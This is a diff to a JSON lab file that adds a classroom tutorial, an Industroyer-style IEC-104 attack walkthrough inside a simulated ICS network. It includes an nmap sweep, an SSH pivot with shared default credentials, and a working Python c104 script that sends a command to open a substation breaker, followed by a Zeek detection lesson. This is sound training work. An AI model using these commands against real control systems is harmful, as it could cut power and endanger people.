@@ -1,6 +1,6 @@
 {
   "name": "ICS Scenario B \u2014 IEC-104 / Industroyer",
-  "description": "Importable ICS attack-scenario lab: IT-LAN / OT-LAN / PROCESS, a dual-homed firewall and historian pivot, a dual-homed IEC-104 RTU, an OVS SPAN port to the IDS, and web UIs on process-sim and the HMI. Uses the tollan Docker Hub registry (you'll be prompted to add it). Author the walkthrough steps in the scenario runner; see docs/ics-scenarios/scenario-b-classroom-walkthrough.md.",
+  "description": "Importable ICS attack-scenario lab: IT-LAN / OT-LAN / PROCESS, a dual-homed firewall and historian pivot, a dual-homed IEC-104 RTU, an OVS SPAN port to the IDS, and web UIs on process-sim and the HMI. Uses the tollan Docker Hub registry (you'll be prompted to add it). Ships an \"IEC-104 attack walkthrough\" tutorial (Tutorials panel); the classroom guide is docs/ics-scenarios/scenario-b-classroom-walkthrough.md.",
   "topology": {
     "name": "ICS Scenario B \u2014 IEC-104 / Industroyer",
     "description": "IT-LAN / OT-LAN / PROCESS with a dual-homed firewall and historian pivot, a dual-homed IEC-104 RTU, and an OVS SPAN port to the IDS. Import this after syncing the `tollan` registry. Node behaviour (RTU/HMI logic, DB+sshd+client tools, process sim) lives in the tollan images; see ics-scenarios-agent-guide.md.",
@@ -167,6 +167,90 @@
         "subnetConnections": []
       }
     ],
-    "siteConnections": []
+    "siteConnections": [],
+    "tutorials": [
+      {
+        "id": "tutorial-ics-iec104",
+        "title": "IEC-104 attack walkthrough",
+        "cells": [
+          {
+            "id": "t-ics-intro",
+            "kind": "markdown",
+            "source": "# IEC-104: from the office network to tripping a breaker\n\nThis is an **Industroyer-style** attack, played end to end from the **attacker** box.\n\n1. **Scan** the office (IT) network and find the historian.\n2. **Pivot** into the historian \u2014 it has one foot in IT and one in the plant (OT) network.\n3. From there, reach the **RTU** (`plc`, `10.0.3.50`) and send a single IEC-104 command that **opens the breaker**.\n4. Look at what the **IDS** actually recorded.\n\n> Run it with **Next step**, or one cell at a time with \u25b6. Each command is typed into the node's own terminal, so once you SSH into the historian the commands that follow run *there*."
+          },
+          {
+            "id": "t-ics-h1",
+            "kind": "markdown",
+            "source": "## 1 \u00b7 Find the historian\n\nA quick ping sweep of the office subnet `10.0.5.0/24`. The host that answers at **`.20`** is the historian \u2014 our stepping stone into the plant."
+          },
+          {
+            "id": "t-ics-scan",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "nmap -sn 10.0.5.0/24"
+          },
+          {
+            "id": "t-ics-h2",
+            "kind": "markdown",
+            "source": "## 2 \u00b7 Pivot into the historian\n\nIT and OT share credentials here, so the office password (`root` / `pass`) also opens the historian. After this, **this terminal is a shell on the historian.**"
+          },
+          {
+            "id": "t-ics-ssh",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "sshpass -p pass ssh -o StrictHostKeyChecking=no root@10.0.5.20"
+          },
+          {
+            "id": "t-ics-h3",
+            "kind": "markdown",
+            "source": "## 3 \u00b7 Confirm the foothold\n\nThe historian is **dual-homed**: `eth0` sits on IT (`10.0.5.20`), `eth1` on OT (`10.0.3.20`). That second leg is exactly what lets an attacker reach the control system."
+          },
+          {
+            "id": "t-ics-legs",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "hostname; ip -o -4 addr show | awk '{print $2, $4}'"
+          },
+          {
+            "id": "t-ics-h4",
+            "kind": "markdown",
+            "source": "The RTU's IEC-104 port **`2404` is open from here**, even though the firewall hides it from the attacker's own subnet. Reachability is the whole prize of the pivot."
+          },
+          {
+            "id": "t-ics-probe",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "nmap -Pn -p 2404 10.0.3.50"
+          },
+          {
+            "id": "t-ics-h5",
+            "kind": "markdown",
+            "source": "## 4 \u00b7 Open the breaker\n\nOne IEC-104 control command does it \u2014 the same kind the HMI sends every day, so nothing about it looks malicious.\n\n- **Common address `47`** \u2014 the substation.\n- **Point `12`** (`C_SC_NA_1`, a single command) \u2014 the breaker.\n- **`value = False`** \u2014 OPEN (`True` would CLOSE).\n\nThe HMI flips to **OPEN** (red) and `process-sim` goes dark. Open either node's **web UI** from the inspector to watch it live."
+          },
+          {
+            "id": "t-ics-open",
+            "kind": "command",
+            "containerId": "attacker",
+            "command": "/opt/venv/bin/python3 <<'PY'\nimport c104, time\nclient = c104.Client()\nconn = client.add_connection(ip=\"10.0.3.50\", port=2404)\nbreaker = conn.add_station(common_address=47).add_point(io_address=12, type=c104.Type.C_SC_NA_1)\nclient.start(); time.sleep(2)\nbreaker.value = False          # False = OPEN, True = CLOSE\nprint(\"sent open ->\", breaker.transmit(cause=c104.Cot.ACTIVATION))\nPY"
+          },
+          {
+            "id": "t-ics-h6",
+            "kind": "markdown",
+            "source": "## 5 \u00b7 What the defender sees\n\nOn the **IDS**, Zeek's connection log shows the attack only as **plain TCP to port `2404`** \u2014 IEC-104 has no open protocol analyzer, so a breaker trip is indistinguishable from a routine poll. That blind spot *is* the lesson.\n\n> Needs Zeek already capturing on the OT SPAN mirror; if the log is empty, start Zeek on the IDS first (see the classroom walkthrough)."
+          },
+          {
+            "id": "t-ics-detect",
+            "kind": "command",
+            "containerId": "ids",
+            "command": "grep -v '^#' /root/zeeklogs/conn.log 2>/dev/null | tail"
+          },
+          {
+            "id": "t-ics-reset",
+            "kind": "markdown",
+            "source": "## Reset & go further\n\n- **Reset:** close the breaker again from the HMI, then `exit` the SSH session on the attacker terminal.\n- **Go further:** the *recovery-denial* loop (re-open on every operator close) is in `docs/ics-scenarios/scenario-b-classroom-walkthrough.md`.\n\nThe takeaway: no exploit, no malware \u2014 just reachability plus a legitimate protocol. Segmentation and OT-aware monitoring are what break this chain."
+          }
+        ]
+      }
+    ]
   }
 }
